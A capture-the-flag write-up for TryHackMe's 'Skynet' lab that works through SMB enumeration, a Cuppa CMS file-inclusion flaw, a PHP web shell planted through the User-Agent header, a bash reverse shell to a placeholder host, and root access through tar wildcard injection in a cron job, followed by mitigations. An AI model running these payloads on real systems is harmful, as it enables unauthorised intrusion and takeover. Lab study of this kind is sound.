# Skynet-TryHackMe-Write-up
Platform: TryHackMe
Difficulty: Easy
Target: 10.49.142.110
Objectives: User and root compromise

Table of Contents

Overview

Reconnaissance

SMB Enumeration

Web Enumeration

Exploitation

Reverse Shell

Privilege Escalation

Root Flag

Vulnerabilities Summary

Attack Chain

Mitigation Recommendations

Overview

Skynet is a beginner-friendly CTF machine on TryHackMe. This machine demonstrates:

SMB enumeration and password discovery

Local File Inclusion (LFI) exploitation

Reverse shell and shell stabilization

Linux privilege escalation using cron and tar wildcard injection

Reconnaissance
nmap -sC -sV -p- 10.49.142.110

Discovered Services:

Port	Service	Version
22	SSH	OpenSSH 7.2p2 Ubuntu
80	HTTP	Apache 2.4.18
139	SMB	Samba smbd
445	SMB	Samba smbd
SMB Enumeration

List shares:

smbclient -L //10.49.142.110 -N

Access anonymous share:

smbclient //10.49.142.110/anonymous -N

Files discovered:

attention.txt
log1.txt

log1.txt contained potential passwords.

Web Enumeration

Access the web server:

http://10.49.142.110

Discovered CMS: Cuppa CMS in /45kra24zxs28v3yd/administrator

Exploitation
Local File Inclusion

Vulnerable script:

http://10.49.142.110/.../alerts/alertConfigField.php?urlConfig=../../../../../../etc/passwd

Output revealed /etc/passwd and milesdyson username.

Remote Command Execution

Injected PHP payload via HTTP User-Agent:

curl -A '<?php system($_GET["cmd"]); ?>' http://10.49.142.110

Triggered reverse shell:

http://10.49.142.110/.../alertConfigField.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
Reverse Shell

Listener:

nc -lvnp 4444

Obtained shell as www-data:

www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$

Shell stabilized:

python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo
Privilege Escalation

Check cron jobs:

cat /etc/crontab

Found:

*/1 * * * * root /home/milesdyson/backups/backup.sh

Exploited tar wildcard injection to get root:

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

Root reverse shell received:

nc -lvnp 5555
root@skynet:/root#
Root Flag
cat /root/root.txt
3f..................949
Vulnerabilities Summary
Vulnerability	Type	Description
SMB Info Leak	Info Disclosure	Passwords stored in plain text
LFI	Web Exploit	Arbitrary file read via URL parameter
Log Poisoning	Web Exploit	Code execution through logs
Tar Wildcard Injection	Privilege Escalation	Exploit cron running tar as root
Attack Chain
SMB Enumeration
      ↓
Password Discovery
      ↓
Web Enumeration
      ↓
LFI Exploitation
      ↓
Reverse Shell as www-data
      ↓
Cron Job Discovery
      ↓
Tar Wildcard Injection
      ↓
Root Access
Mitigation Recommendations

Sanitize user input in PHP includes.

Disable LFI and RFI vulnerabilities.

Avoid wildcard usage in root scripts.

Limit SMB share access.

Regularly monitor cron jobs and logs.
